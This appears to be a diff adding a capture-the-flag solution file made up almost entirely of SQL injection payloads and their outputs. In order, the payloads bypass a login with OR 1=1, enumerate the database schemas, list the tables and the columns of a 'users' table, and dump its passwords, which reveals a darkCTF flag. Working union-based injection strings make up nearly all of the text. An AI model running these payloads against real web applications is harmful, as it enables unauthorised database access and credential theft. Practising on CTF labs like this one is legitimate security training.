@@ -1,0 +1,17 @@
+"+OR+1%3d1--+-
+
+# get database
+"+UNION+SELECT+1,2,(SELECT+group_concat(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA)--+-
+	information_schema,mysql,performance_schema,security,sys
+
+# get table
+" union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')-- -
+	emails,referers,uagents,users
+
+# get column
+" union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema='security' AND table_name='users')-- -
+	id,username,password
+
+# get value
+" union select 1,2,(select group_concat(password) from security.users)-- -
+	darkCTF{it_is_very_easy_to_find}
